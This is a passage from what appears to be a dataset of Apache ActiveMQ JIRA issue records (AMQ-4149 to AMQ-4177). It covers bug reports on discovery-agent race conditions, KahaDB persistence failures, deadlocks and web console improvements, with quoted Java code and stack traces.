static subscription consumers from existing bridges are unexpectedly propagated to new bridges, while the dynamic subscription consumers are correctly suppressed.Solution========There should be no logical difference between a network consumer created for a static subscription vs. a dynamic subscription.  In either case, the bridge creates a consumer on behalf of the remote broker.  As such, the consumer for a static subscription should have the remote broker in its broker path because it represents a subscription from that remote broker (even if there is no consumer).
issueID:AMQ-4149
type:Bug
changed files:
texts:Removal of inactive durable subscribers not working after broker restart
ActiveMQ can automatically unsubscribe durable subscribers that are not active for some period of time http://activemq.apache.org/manage-durable-subscribers.html.It however, doesn"t remove inactive subscriptions created before it is restarted.Steps to reproduce:1) Configure ActiveMQ to remove inactive durable subscriptions2) Create a durable subscription3) Restart brokerthe inactive durable subscription is never removed
issueID:AMQ-4153
type:Bug
changed files:
texts:ActiveMQWASInitialContextFactory issue in transform logic
See nabblehttp://activemq.2283324.n4.nabble.com/Help-configuring-ActiveMQ-as-JMSProvider-in-WebSphere-tp4658603.htmlThe code in ActiveMQWASInitialContextFactory is flawed.If the WAS has:java.naming.queue=jms/systemMessageQueueThen the logic assumes there is a .xxx in the key, egjava.naming.queue.foo=jms/systemMessageQueueBut it may not be and then you get a StringIndexOutOfBoundsException
issueID:AMQ-4154
type:Bug
changed files:
texts:Karaf activemq feature can&#39;t be installed due to the unresolved dependencies
Trying to install ActiveMQ 5.8-SNAPSHOT feature compiled from latest trunk to Apache Karaf and got next error: java.lang.Exception: Can not resolve feature:Unsatisfied requirement(s):---------------------------   package:(&(package=org.codehaus.jackson.map)(version>=1.9.0)(!(version>=2.0.0)))      activemq-console   package:(&(package=org.fusesource.hawtbuf)(version>=1.9.0)(!(version>=2.0.0)))      activemq-console   package:(&(package=org.fusesource.hawtbuf.proto)(version>=1.9.0)(!(version>=2.0.0)))      activemq-consoleSeems like unresolved dependencies were added in revision 1402652 (AMQ-4137 fix).
issueID:AMQ-4156
type:Bug
changed files:AbstractInactivityMonitor.java
texts:Inactivity monitor rejected from thread pool
2012/09/04 17:50:10.746 &#91;UncaughtExceptionHandler&#93; &#91;InactivityMonitor WriteCheck&#93;:   ERROR:  FATAL ERROR Uncaught Exception occurred in thread Thread&#91;InactivityMonitor WriteCheck,5,main&#93;  [Exception: java.util.concurrent.RejectedExecutionException: Task org.apache.activemq.transport.InactivityMonitor$3@321e23e9 rejected from java.util.concurrent.ThreadPoolExecutor@58c7afb3&#91;Terminated, pool size = 0, active threads = 0, queued tasks = 0, completed tasks = 441&#93; at java.util.concurrent.ThreadPoolExecutor$AbortPolicy.rejectedExecution(ThreadPoolExecutor.java:2013) at java.util.concurrent.ThreadPoolExecutor.reject(ThreadPoolExecutor.java:816) at java.util.concurrent.ThreadPoolExecutor.execute(ThreadPoolExecutor.java:1337) at org.apache.activemq.transport.InactivityMonitor.writeCheck(InactivityMonitor.java:147) at org.apache.activemq.transport.InactivityMonitor$2.run(InactivityMonitor.java:113) at org.apache.activemq.thread.SchedulerTimerTask.run(SchedulerTimerTask.java:33) at java.util.TimerThread.mainLoop(Timer.java:555) at java.util.TimerThread.run(Timer.java:505)] N.B. The system was not shutting down as far as I can see. It was on a VM, and the logs show a long idle gap before this excerpt. Which may mean the VM was paused, although gaps may occur in normal operation as well. I only have one log as evidence, although people have seen it a few more times apparently.
issueID:AMQ-4157
type:Bug
changed files:
texts:KahaDBTransactionStore.removeAyncMessage may cancel addMessage when in transaction leading to unpersisted messages
This was very difficult to track down.  It rarely occurs because a certain set of events must be occurring to trigger the bug.   I have marked it a Blocker because when it does occur, it is silent and leads to a message not being persisted in the MessageStore.DescriptionThe crux of the bug is that when a rollback on a session occurs, the resulting MessageAck can overlap with the async store of the message in the KahaDB.   When this occurs, the message is never persisted.  Additionally, the resultant CancellationException is ignored in o.a.a.broker.region.Queue:796.   The steps: a StoreQueueTask is created to add a message X.  this is put on the async task queue meanwhile this message is dispatched via a prefetch subscription to a transacted consumer. the transacted consumer calls session.rollback this leads to acknowledgement of the dispatched message as a result destination.removeAsyncMessage() is called if the original add has not yet executed then it will be cancelled leading to the message never being persisted!  (occurs at KahaDBStore:401) the Queue.send method uses the result future to make sure the persist happens in the store, but it ignores cancellation, so this can lead execution control to return to the sender when no persistence has occurred without an error.I have not been able to reproduce this in a small activemq-only test.  But I can reproduce it in my environment.  Proposed SolutionsI"m really unsure of the solution here.  Should KahaDBStore.removeAsyncMessage (line 393) check the context and only cancel tasks if it is not in a transaction context?  But what would that mean in the log?  Would there be a removeMessage prior to the addMessage?Workaround turn off caching for the destination (see dest policies).  this will cause messages to be added synchronously so they will not be subject to the async cancellation
issueID:AMQ-4158
type:Bug
changed files:
texts:BTreeIndexTest hangs when run on Windows
BTreeIndexTest hangs when run on windows because it repeatedly tries to create/delete the same directory, which is problematic on windows.  I"ve attached a patch which just adds a timestamp to the directory name.
issueID:AMQ-4159
type:Bug
changed files:
texts:Race condition in SimpleDiscoveryAgent creates multiple concurrent threads attempting to connect to the same bridge --- can result in deadlock
Symptom=======I was diagnosing a deadlock issue in DiscoveryNetworkConnector and noticed that during one of the tests, concurrent calls were being made to DiscoveryNetworkConnector.onServiceAdd(...) for the same DiscoveryEvent.  This was unexpected because only a single service (URL) had been given to SimpleDiscoveryAgent.  In fact, during one of the tests I observed dozens of concurrent calls.Concurrent attempts to establish a bridge to the same remote broker are problematic because they expose a number of race conditions in DiscoveryNetworkConnector and RegionBroker that can lead to permanent bridge failure (see AMQ-4160), as well as unnecessary thread pool execution/resource usage and logging.The issues with DiscoveryNetworkConnector and RegionBroker will be filed as separate issues.  This issue specifically addresses the bug that causes SimpleDiscoveryAgent to uncontrollably multiply bridge connection attempts.Cause=====When DemandForwardingBridgeSupport handles exceptions from either the local or remote sides of the the bridge, it fires a "bridge failed" event:DemandForwardingBridgeSupport.javapublic void serviceLocalException(Throwable error) {    if (!disposed.get()) {        LOG.info("Network connection between " + localBroker + " and " + remoteBroker + " shutdown due to a local error: " + error);        LOG.debug("The local Exception was:" + error, error);        brokerService.getTaskRunnerFactory().execute(new Runnable() {            public void run() {                ServiceSupport.dispose(getControllingService());            }        });        fireBridgeFailed();    }}public void serviceRemoteException(Throwable error) {    if (!disposed.get()) {        if (error instanceof SecurityException || error instanceof GeneralSecurityException) {            LOG.error("Network connection between " + localBroker + " and " + remoteBroker + " shutdown due to a remote error: " + error);        } else {            LOG.warn("Network connection between " + localBroker + " and " + remoteBroker + " shutdown due to a remote error: " + error);        }        LOG.debug("The remote Exception was: " + error, error);        brokerService.getTaskRunnerFactory().execute(new Runnable() {            public void run() {                ServiceSupport.dispose(getControllingService());            }        });        fireBridgeFailed();    }}private void fireBridgeFailed() {    NetworkBridgeListener l = this.networkBridgeListener;    if (l != null) {        l.bridgeFailed();    }}DiscoveryNetworkConnector is the NetworkBridgeListener, and its bridgeFailed() method calls back to SimpleDiscoveryAgent.serviceFailed(...):DiscoveryNetworkConnectol.javaprotected NetworkBridge createBridge(Transport localTransport, Transport remoteTransport, final DiscoveryEvent event) {    class DiscoverNetworkBridgeListener extends MBeanNetworkListener {        public DiscoverNetworkBridgeListener(BrokerService brokerService, ObjectName connectorName) {            super(brokerService, connectorName);        }        public void bridgeFailed() {            if (!serviceSupport.isStopped()) {                try {                    discoveryAgent.serviceFailed(event);                } catch (IOException e) {                }            }        }    }...In response, SimpleDiscoveryAgent.serviceFailed(...) pauses for the reconnectDelay before attempting to re-establish the bridge via DiscoveryNetworkConnector.onServiceAdd(...):SimpleDiscoveryAgent.javapublic void serviceFailed(DiscoveryEvent devent) throws IOException {    final SimpleDiscoveryEvent event = (SimpleDiscoveryEvent)devent;    if (sevent.failed.compareAndSet(false, true)) {        listener.onServiceRemove(sevent);        taskRunner.execute(new Runnable() {            public void run() {                // We detect a failed connection attempt because the service                // fails right                // away.                if (event.connectTime + minConnectTime > System.currentTimeMillis()) {                    LOG.debug("Failure occurred soon after the discovery event was generated.  It will be classified as a connection failure: "+event);...                    synchronized (sleepMutex) {                        try {                            if (!running.get()) {                                LOG.debug("Reconnecting disabled: stopped");                                return;                            }                            LOG.debug("Waiting "+event.reconnectDelay+" ms before attempting to reconnect.");                            sleepMutex.wait(event.reconnectDelay);                        } catch (InterruptedException ie) {                            LOG.debug("Reconnecting disabled: " + ie);                            Thread.currentThread().interrupt();                            return;                        }                    }...                event.connectTime = System.currentTimeMillis();                event.failed.set(false);                listener.onServiceAdd(event);            }        }, "Simple Discovery Agent");    }}NOTE: the call to listener.onServiceAdd(...) is made by a new thread!There are two race conditions that allow SimpleDiscoveryAgent.serviceFailed(...) to launch more than one thread, each attempting to re-restablish the same bridge.First, note that DemandForwardingBridgeSupport.serviceLocal/RemoteException(...) launches a separate thread that stops the bridge:DemandForwardingBridgeSupport.javapublic void serviceRemoteException(Throwable error) {    if (!disposed.get()) {        if (error instanceof SecurityException || error instanceof GeneralSecurityException) {            LOG.error("Network connection between " + localBroker + " and " + remoteBroker + " shutdown due to a remote error: " + error);        } else {            LOG.warn("Network connection between " + localBroker + " and " + remoteBroker + " shutdown due to a remote error: " + error);        }         LOG.debug("The remote Exception was: " + error, error);        brokerService.getTaskRunnerFactory().execute(new Runnable() {            public void run() {                ServiceSupport.dispose(getControllingService());            }        });        fireBridgeFailed();    }}public void stop() throws Exception {    if (started.compareAndSet(true, false)) {        if (disposed.compareAndSet(false, true)) {            LOG.debug(" stopping " + configuration.getBrokerName() + " bridge to " + remoteBrokerName);            NetworkBridgeListener l = this.networkBridgeListener;            if (l != null) {                l.onStop(this);            }When the bridge stops, the disposed flag is set, which prevents subsequent calls to serviceLocal/RemoteException(...) from calling fireBridgeFailed().  However, since the call to DemandForwardingBridgeSupport.stop() is made by a separate thread, multiple serviceLocal/RemoteException(...) calls that are made in quick succession can result in multiple calls to fireBridgeFailed().This is the first race condition: multiple calls can be made to DiscoveryNetworkConnector.bridgeFailed() for the same bridge.  By transitivity, this results in multiple calls to SimpleDiscoveryAgent.serviceFailed(...).SimpleDiscoveryAgent.serviceFailed(...) has a guard class, event.failed.compareAndSet(false, true), which should only allow the first call to launch a bridge reconnect thread.  However, once the reconnectDelay expires, event.failed is reset to false, which allows re-entry to the failure handling logic, and the possibile launching of additional bridge reconnect threads if the reconnectDelay is short or the threads calling serviceFailed(...) are delayed.This is the second race condition: the guard clause in SimpleDiscoveryAgent.serviceFailed(...) can be reset before the subsequent redundant calls have been filtered out.These two race conditions allow a single call to DiscoveryNetworkConnector.onServiceAdd(...) to result in multiple subsequent concurrent (re)calls, and these concurrent calls can spawn their own multiple concurrent calls.  The result can be an unlimited number of concurrent calls to onServiceAdd(...).Unit Test=========The attached unit test demonstrates this bug by simulating a bridge failure that has yet to be detected by the remote broker (i.e., before the InactivityMonitor closes the connection).  The local broker attempts to re-establish the bridge, but its call to DemandForwardingBridge.startRemoteBroker() fails because the remote broker rejects the new connection since the old one still exists.  Since startRemoteBroker sends multiple messages to the remote broker, multiple exceptions are generated:DemandForwardingBridgeSupport.javaprotected void startRemoteBridge() throws Exception {...                remoteBroker.oneway(brokerInfo);...            remoteBroker.oneway(remoteConnectionInfo);...            remoteBroker.oneway(producerInfo);...                remoteBroker.oneway(demandConsumerInfo);}The multiple exceptions result in multiple calls to DemandForwardingBridgeSupport.serviceRemoteException(...), which allows the first race condition to be exhibited.  The first unit test has a 1s reconnectDelay, which is sufficient to make the second race condition improbable; therefore, this test generally passes. The second unit test has a 0s reconnectDelay; on my system, this makes the timing of multiple calls to DemandForwardingBridgeSupport.serviceRemoteException(...) such that the second race condition is reliably exhibited, resulting in the unit test failing because it detects concurrent calls to DiscoveryNetworkConnector.onServiceAdd(...).Solution========While it would be possible to add a failed.compareAndSet(false,true) guard clause to DemandForwardingBridgeSupport.fireBridgeFailed(), and prevent the first race condition from allowing multiple calls to SimpleDiscoveryAgent.serviceFailed(), the root problem is the race condition in serviceFailed.  This can be trivially addressed by making a copy of the DiscoveryEvent, which prevents the original event.failed guard clause from being reset:Patched SimpleDiscoveryAgent.javapublic void serviceFailed(DiscoveryEvent devent) throws IOException {    final SimpleDiscoveryEvent sevent = (SimpleDiscoveryEvent)devent;    if (sevent.failed.compareAndSet(false, true)) {        listener.onServiceRemove(sevent);        taskRunner.execute(new Runnable() {            public void run() {                SimpleDiscoveryEvent event = new SimpleDiscoveryEvent(sevent);...                event.connectTime = System.currentTimeMillis();                event.failed.set(false);                listener.onServiceAdd(event);            }        }, "Simple Discovery Agent");    }}
issueID:AMQ-4160
type:Bug
changed files:
texts:DiscoveryNetworkConnector can lose track of active bridges, resulting in permanent bridge failure or continued attempts to re-connect existing bridges
Symptom=======DiscoveryNetworkConnector is not thread-safe, and as a result, race conditions allow the bridges data structure to become corrupt and not accurately represent the bridges that exist.Because bridges is used to control whether a discovery event will result in a bridge creation attempt, if it is not accurate, two results are possible: A discovery event will be ignored even though its corresponding bridge is not active; as a result, the bridge will never be established A discovery event will be processed even though its corresponding bridge is active; as a result, the bridge creation will fail (because of duplicate connections), and be indefinitely retried, generating many WARN/ERROR log messagesCause=====DiscoveryNetworkConnector updates a bridges hashmap whenever a bridge is created or removed:DiscoveryNetworkConnector.javapublic void onServiceAdd(DiscoveryEvent event) {...        // Should we try to connect to that URI?        synchronized (bridges) {            if( bridges.containsKey(uri) ) {                if (LOG.isDebugEnabled()) {                    LOG.debug("Discovery agent generated a duplicate onServiceAdd event for: "+uri );                }                return;            }        }...        NetworkBridge bridge = createBridge(localTransport, remoteTransport, event);        try {            bridge.start();            synchronized (bridges) {                bridges.put(uri, bridge);            }...}public void onServiceRemove(DiscoveryEvent event) {    String url = event.getServiceName();    if (url != null) {        URI uri;        try {            uri = new URI(url);        } catch (URISyntaxException e) {            LOG.warn("Could not connect to remote URI: " + url + " due to bad URI syntax: " + e, e);            return;        }        synchronized (bridges) {            bridges.remove(uri);        }    }}There are a number of problems: The check-and-set for adding an entry bridges is not atomic.  As a result, concurrent attempts to add a bridge to the same URL can be allowed to proceed to bridge creation.  Only one of the bridges will be established (the other will fail when it attempts to add duplicate connections); however, the failure of the second bridge will result in a call to onServiceRemove(...) that will remove the single/shared bridges entry. The bridge is started before an entry is added to bridges.  Since bridges are multi-threaded, it is possible that an exception will be handled by a different thread at some time between bridge.start() and bridges.put(uri, bridge.  In processing this exception, the thread will call onServiceRemove(..., which will remove the (non-existent) bridges entry.  Subseqently, bridges.put(uri, bridge) is executed, and adds the entry to bridges even though it is now stale and represents a failed bridge.  Subsequent attempts to restore the bridge will be ignored, and no active bridge will be created.The lack of thread-safety in DiscoveryNetworkConnector is exacerbated by AMQ-4159, which can result in many concurrent attempts to establish a bridge to the same URL.  AMQ-4159 also described how multiple calls can be made to onServiceRemove(...), which can result in mal-behaviour similar to the second case described above (i.e., unexpected removal of a bridge that is active).Solution========The attached patch attempts to restore some thread-safety to DiscoveryNetworkConnector by making the check-and-set atomic and adding the entry to bridges prior to starting the bridge.  An additional structure, activeEvents, keeps track of the event that represents the current attempt to establish a bridge to a given remote URL &#8212; this is used to prevent multiple calls to onServiceRemove(...) from removing a bridges entry that was not added by the corresponding discovery event.  This patch is a band aid to the design flaws in DiscoveryNetworkConnector, and a refactoring of the connector should be considered.  In particular, there is a tight-coupling between DiscoveryNetworkConnector and SimpleDiscoveryAgent that is not evident through their interfaces.  For example, DiscoveryNetworkConnector assumes that the call to discoveryAgent.serviceFailed(...) will result in a call back to DiscoveryNetworkConnector.onServiceRemove(...).  The call to onServiceRemove(...) is necessary to clean up the resources used by the bridge, but that requirement is not explicit, and therefore easily missed.
issueID:AMQ-4161
type:Improvement
changed files:StatisticsBroker.java
texts:List of Messages from StatsPlugin is not delimited
When using a wild card to get destination statistics, a message for each destination will be sent to the replyTo destination, however, there is no way to determine when the query has finished. By appending ".List.End.With.Null" to the destination, an empty map message will be sent to denote the end of the messages. E.G. - to query statistics on all Queues, you would send an empty message to the Queue ActiveMQ.Statistics.Destination.> - to get all the destinations. To ensure you got an empty message to denote the end of the list - you would send a queue message to ActiveMQ.Statistics.Destination.>.List.End.With.Null
issueID:AMQ-4162
type:New Feature
changed files:
texts:Provide JMX visibility into options applied via destination name query parameters
Users would like to be able to add meta information to a destination, such as the owner of a queue.Destination options allow arbitrary information to be associated with a destination via a query parameter on the name.They are normally hidden b/c they are interpreted internally as policy entry overrides so not generally of interest.Providing visibility of this information makes it usable for meta info purposes b/c a user can add any information they like in there. <broker ...>   <destinations>     <queue physicalName="FOO.BAR?owner=joe&mobile=123" />   </destinations> </broker>via JMX the query string is available in the DestinationView via the options attribute.Changing this information over time does not effect the destination.
issueID:AMQ-4163
type:Task
changed files:
texts:Remove old cruft from activemq-camel component such as the kaha journal component
In the activemq-camel component we have a fair bit of old code that are not in use. For example the journal component using the old kaha module. As well as some other stuff.Instead we should just keep the JMS based component which is what all people uses.
issueID:AMQ-4165
type:Improvement
changed files:
texts:Remove pure master/slave functionality
Pure master/slave was introduced over 7 years ago a means of getting a tick box for high availability. It is severely limited, in that only one slave is supported, a slave must be running before the master and no attempt is made at synchronising a new slave.Unfortunately, pure master/slave is sometimes used as an option by ActiveMQ users, unaware of the dangers of doing so, at extreme risk to themselves and others.Pure master/slave is the spawn of hell and should be removed forthwith.
issueID:AMQ-4166
type:Bug
changed files:
texts:RedeliveryPlugin causes a deadlock with JobSchedulerImpl
Originates from the forum discussion http://activemq.2283324.n4.nabble.com/RedeliveryPlugin-causes-a-deadlock-with-JobSchedulerImpl-in-ActiveMQ-5-7-0-tt4659019.htmlwe have RedeliveryPlugin causing thread deadlock together with JobSchedulerImpl. ActiveMQ version is 5.7.0. We activated RedeliveryPlugin in our broker config xml (see below). There two stacktraces below as well. One is from ActiveMQ VMTransport thread, which tries to send a message to a dead letter queue using RedeliveryPlugin. RedeliveryPlugin just tries to reschedule the message for redelivery and for that it calls JobSchedulerImpl and blocks on its synchronized method "schedule". On the way "consumersLock" is locked. Another stack trace is from JobScheduler:JMS thread, which fires a job to redeliver some message and tries to send it using the same queue used by the VMTransport thread. And it blocks on that consumersLock locked by the VMTransport thread. And this occurs in JobSchedulerImpl#mainLoop method inside synchronized {} block causing a deadlock, since the VMTransport thread tries to call another synchronized method of JobSchedulerImpl. The art how RedeliveryPlugin and JobSchedulerImpl are programmed seems to be quite dangerous, since they both access the queues and try to acquire queue locks. And additionally synchronized methods of JobSchedulerImpl are called directly from RedeliveryPlugin making that to a nice source of thread deadlocks. And I see no measures taken in the code to avoid these deadlocks.We can reproduce it quite often if we start ActiveMQ with empty stores (kahadb and scheduler stores are deleted manually from the file system before startup). But looking at the code, I would say that the problem may occur in any situation in any deployment scenario (standalone or embedded in a JEE container). It is just enough to have some Transport thread redelivering a message and the JobScheduler thread trying to fire a job at the same moment on the same queue.And another strange thing, which is may be has nothing to do with the deadlock but is still strange, is that according to the stack trace RedeliveryPlugin tries to redeliver an expired message.broker config and the stack traces are attached to the issue.
issueID:AMQ-4167
type:Bug
changed files:
texts:MQTTTest.testInactivityTimeoutDisconnectsClient is failing
Disabled MQTTTest.testInactivityTimeoutDisconnectsClient since it is failing.  Need to look into why.
issueID:AMQ-4169
type:Improvement
changed files:
texts:correct maven-X-plugin naming to respect convention
maven is barfing at out plugin naming.[INFO] [INFO] --- maven-plugin-plugin:3.1:descriptor (default-descriptor) @ maven-activemq-plugin ---[ERROR] Artifact Ids of the format maven-___-plugin are reserved for plugins in the Group Id org.apache.maven.pluginsPlease change your artifactId to the format ___-maven-pluginIn the future this error will break the build.
issueID:AMQ-4171
type:Bug
changed files:DataFile.java
texts:KahaDB / Journal rotateWriteFIle() sometimes too fast?
On very fast test machines we got predictable FileNotFoundExceptions when a KahaDB data file was to be replaced by its successor.See this from the log file:30.10.2012 21:00:56.359 &#91;ActiveMQ Transport: tcp:///192.168.111.128:3134&#93; [  ]  master-My-Company-S1-kellner20-vm Message ID:kellner20-vm-3125-1351618296390-23:1:1:2086:1 sent to queue://My-Company.dxm.request.provisionToTS30.10.2012 21:00:56.359 [BrokerService&#91;master-My-Company-S1-kellner20-vm&#93; Task-197] [  ]  My-Company.dxm.request.provisionToTS toPageIn: 1, Inflight: 0, pagedInMessages.size 0, enqueueCount: 2125, dequeueCount: 2124-------------------------------------------------------------------------------30.10.2012 21:00:56.390 &#91;ConcurrentQueueStoreAndDispatch&#93; [  ] *** SEVERE ***Called from org.apache.activemq.store.kahadb.MessageDatabase.store() KahaDB failed to store to Journal-------------------------------------------------------------------------------java.io.FileNotFoundException: activemq-datamaster-My-Company-S1-kellner20-vmKahaDBdb-2.log (The system cannot find the path specified) at java.io.RandomAccessFile.open(Native Method) at java.io.RandomAccessFile.<init>(Unknown Source) at org.apache.kahadb.journal.DataFile.openRandomAccessFile(DataFile.java:70) at org.apache.kahadb.journal.DataFileAppender.processQueue(DataFileAppender.java:309) at org.apache.kahadb.journal.DataFileAppender$1.run(DataFileAppender.java:188)30.10.2012 21:00:56.375 [BrokerService&#91;master-My-Company-S1-kellner20-vm&#93; Task-197] [  ]  org.apache.activemq.broker.region.cursors.QueueStorePrefetch@1afd356:My-Company.dxm.request.provisionToTS,batchResetNeeded=false,storeHasMessages=true,size=0,cacheEnabled=true - fillBatch30.10.2012 21:00:56.421 &#91;ConcurrentQueueStoreAndDispatch&#93; [  ] NOTIFICATION:  HighWater of SEVERE exceeded (value=1, highwater=1)!30.10.2012 21:00:56.437 &#91;ConcurrentQueueStoreAndDispatch&#93; [  ]  Stopping the broker due to IO exception, java.io.FileNotFoundException: activemq-datamaster-My-Company-S1-kellner20-vmKahaDBdb-2.log (The system cannot find the path specified)java.io.FileNotFoundException: activemq-datamaster-My-Company-S1-kellner20-vmKahaDBdb-2.log (The system cannot find the path specified) at java.io.RandomAccessFile.open(Native Method) at java.io.RandomAccessFile.<init>(Unknown Source) at org.apache.kahadb.journal.DataFile.openRandomAccessFile(DataFile.java:70) at org.apache.kahadb.journal.DataFileAppender.processQueue(DataFileAppender.java:309) at org.apache.kahadb.journal.DataFileAppender$1.run(DataFileAppender.java:188)********************(end of log file quotation)********************Having evaluated all possibilities of the failure, we finally patched the following method of the class Journal::synchronized DataFile rotateWriteFile() {        int nextNum = !dataFiles.isEmpty() ? dataFiles.getTail().getDataFileId().intValue() + 1 : 1;        File file = getFile(nextNum);        DataFile nextWriteFile = new DataFile(file, nextNum, preferedFileLength);PATCH START       try {      Thread.sleep(10000);  } catch (InterruptedException e) {   e.printStackTrace();  }PATCH END        // actually allocate the disk space        fileMap.put(nextWriteFile.getDataFileId(), nextWriteFile);        fileByFileMap.put(file, nextWriteFile);        dataFiles.addLast(nextWriteFile);        return nextWriteFile;    }*************This helped, the IO Exception never occurred again after this patch.It seems that the "nextWriteFile"-object was  returned, while the allocating of the new Data File wasn"t finished yet. Anyway, it is very strange that we should have detected this problem, and it never occurred earlier - at least no similar bug (???) seems to have been reported. Therefore, a critical examination of possibly deeper causes could be useful.Best regards, Matthias VetterATOS, Frankfurt
issueID:AMQ-4172
type:Bug
changed files:
texts:RAR needs additional module includes post module refactor
see results of some 5.8-SNAPSNOT verificationhttps://issues.apache.org/jira/browse/AMQ-4166?focusedCommentId=13497034&page=com.atlassian.jira.plugin.system.issuetabpanels:comment-tabpanel#comment-13497034seems spring and core modules need to be included in the rar.
issueID:AMQ-4174
type:Improvement
changed files:MoveMessage.java
DestinationFacade.java
message.jsp
DeleteMessage.java
CopyMessage.java
texts:Deleting/moving a message from queue overview should redirect back to overview of the queue
When one deletes a message from the overview of a queue, one is redirected to the overview showing all queues. This makes deleting multiple messages tedious work, since you have to find the queue to delete from for each message that you want to delete. The same goes for moving a message, you get thrown back to start instead of the queue overview, which would be nice in cases where you want to move multiple messages in the same queue (which is quite often, specially for dead-letter queues).Is it possible to change the redirect to the overview of the queue that was moved/deleted from?
issueID:AMQ-4175
type:New Feature
changed files:
texts:Adding a retry-button
In the project I"m working on, we have set up to have one dead-letter queue for each queue. In the web console of the AMQ 5.3.0 instance that was running up until recently (we upgraded to 5.7.0), there was a link for "retry" in both the overview of a queue and the overview of a message. What this did was to move the message to its intended destination, for retrying failed messages that wound up in a dead-letter queue.I could not see this feature in AMQ 5.7.0, and after a bit of investigation, it turned out that this was added by the people who set up AMQ 5.3.0.In my opinion this is a really nice thing to have, specially if you have a large number of queues. Going through the list of queues and finding the correct one to move to for each failed message is a lot more work than just clicking a retry-button.I"ll attach my tweaked versions of browse.jsp and message.jsp, containing the retry button. If you decide to take it in, it should be generalized a little (right now the prefixes we set up to use for dead-letter queues and topics are hard-coded). There are also a few minor tweaks, most notably one that makes sure that the whole queue name is showing in the dropdown for selecting a queue to move/copy to (having ~80 queues, most with the same prefix in their name, gave only the four last letters of the queue name to identify it by when it was shortened, impossible to work with..)
issueID:AMQ-4177
type:Improvement
changed files:DestinationView.java
texts:browseMessages() fails when using Jolokia to browse JMX
I tried using Jolokia to browse the JSON view of JMX for ActiveMQ. Things generally worked great, however the browseMessages() function causes issues with the Jolokia JSON marshaller - it seems we return beans which are not really usable as is. Not sure how easy this is to fix...NOTE the browse() works fine; I wasn"t sure if all bean properties were properly exposed in the CompositeData browse() function - so not sure how big a deal not having browseMessages() is...Here"s the stack trace when browsing a queue called "cheese" on a JVM running ActiveMQ and jolokia servlet such as with a URL like: http://localhost:8080/jolokia/exec/org.apache.activemq:BrokerName=localhost,Destination=cheese,Type=Queue/browseMessages()The offending bit of the stack trace is: org.apache.activemq.ConnectionClosedException: The connection is already closed at org.apache.activemq.ActiveMQConnection.checkClosed(ActiveMQConnection.java:1462) at I guess there"s a connection property or something on the message maybe?{error_type: "java.lang.IllegalStateException",error: "java.lang.IllegalStateException : Error while extracting metaData from ActiveMQConnection {id=ID:stracmac.home-58797-1352910163300-7:1,clientId=ID:stracmac.home-58797-1352910163300-6:1,started=false}",status: 500,stacktrace: "java.lang.IllegalStateException: Error while extracting metaData from ActiveMQConnection {id=ID:stracmac.home-58797-1352910163300-7:1,clientId=ID:stracmac.home-58797-1352910163300-6:1,started=false} at org.jolokia.converter.json.BeanExtractor.extractBeanPropertyValue(BeanExtractor.java:242) at org.jolokia.converter.json.BeanExtractor.extractJsonifiedPropertyValue(BeanExtractor.java:161) at org.jolokia.converter.json.BeanExtractor.exctractJsonifiedValue(BeanExtractor.java:147) at org.jolokia.converter.json.BeanExtractor.extractObject(BeanExtractor.java:78) at org.jolokia.converter.json.ObjectToJsonConverter.callHandler(ObjectToJsonConverter.java:351) at org.jolokia.converter.json.ObjectToJsonConverter.extractObject(ObjectToJsonConverter.java:181) at org.jolokia.converter.json.BeanExtractor.extractJsonifiedPropertyValue(BeanExtractor.java:169) at org.jolokia.converter.json.BeanExtractor.exctractJsonifiedValue(BeanExtractor.java:147) at org.jolokia.converter.json.BeanExtractor.extractObject(BeanExtractor.java:78) at org.jolokia.converter.json.ObjectToJsonConverter.callHandler(ObjectToJsonConverter.java:351) at org.jolokia.converter.json.ObjectToJsonConverter.extractObject(ObjectToJsonConverter.java:181) at org.jolokia.converter.json.ListExtractor.extractObject(ListExtractor.java:71) at org.jolokia.converter.json.ObjectToJsonConverter.callHandler(ObjectToJsonConverter.java:351) at org.jolokia.converter.json.ObjectToJsonConverter.extractObject(ObjectToJsonConverter.java:181) at org.jolokia.converter.json.ObjectToJsonConverter.extractObjectWithContext(ObjectToJsonConverter.java:144) at org.jolokia.converter.json.ObjectToJsonConverter.convertToJson(ObjectToJsonConverter.java:116) at org.jolokia.backend.BackendManager.callRequestDispatcher(BackendManager.java:340) at org.jolokia.backend.BackendManager.handleRequest(BackendManager.java:140) at org.jolokia.http.HttpRequestHandler.executeRequest(HttpRequestHandler.java:175) at org.jolokia.http.HttpRequestHandler.handleGetRequest(HttpRequestHandler.java:79) at org.jolokia.http.AgentServlet$3.handleRequest(AgentServlet.java:296) at org.jolokia.http.AgentServlet.handle(AgentServlet.java:228) at org.jolokia.http.AgentServlet.doGet(AgentServlet.java:193) at javax.servlet.http.HttpServlet.service(HttpServlet.java:735) at javax.servlet.http.HttpServlet.service(HttpServlet.java:848) at org.eclipse.jetty.servlet.ServletHolder.handle(ServletHolder.java:598) at org.eclipse.jetty.servlet.ServletHandler.doHandle(ServletHandler.java:486) at org.eclipse.jetty.server.handler.ScopedHandler.handle(ScopedHandler.java:119) at org.eclipse.jetty.security.SecurityHandler.handle(SecurityHandler.java:524) at org.eclipse.jetty.server.session.SessionHandler.doHandle(SessionHandler.java:233) at org.eclipse.jetty.server.handler.ContextHandler.doHandle(ContextHandler.java:1065) at org.eclipse.jetty.servlet.ServletHandler.doScope(ServletHandler.java:413) at org.eclipse.jetty.server.session.SessionHandler.doScope(SessionHandler.java:192) at org.eclipse.jetty.server.handler.ContextHandler.doScope(ContextHandler.java:999) at org.eclipse.jetty.server.handler.ScopedHandler.handle(ScopedHandler.java:117) at org.eclipse.jetty.server.handler.HandlerWrapper.handle(HandlerWrapper.java:111) at org.eclipse.jetty.server.Server.handle(Server.java:350) at org.eclipse.jetty.server.AbstractHttpConnection.handleRequest(AbstractHttpConnection.java:454) at org.eclipse.jetty.server.AbstractHttpConnection.headerComplete(AbstractHttpConnection.java:890) at org.eclipse.jetty.server.AbstractHttpConnection$RequestHandler.headerComplete(AbstractHttpConnection.java:944) at org.eclipse.jetty.http.HttpParser.parseNext(HttpParser.java:630) at org.eclipse.jetty.http.HttpParser.parseAvailable(HttpParser.java:230) at org.eclipse.jetty.server.AsyncHttpConnection.handle(AsyncHttpConnection.java:77) at org.eclipse.jetty.io.nio.SelectChannelEndPoint.handle(SelectChannelEndPoint.java:606) at org.eclipse.jetty.io.nio.SelectChannelEndPoint$1.run(SelectChannelEndPoint.java:46) at org.eclipse.jetty.util.thread.QueuedThreadPool.runJob(QueuedThreadPool.java:603) at org.eclipse.jetty.util.thread.QueuedThreadPool$3.run(QueuedThreadPool.java:538) at java.lang.Thread.run(Thread.java:722) Caused by: 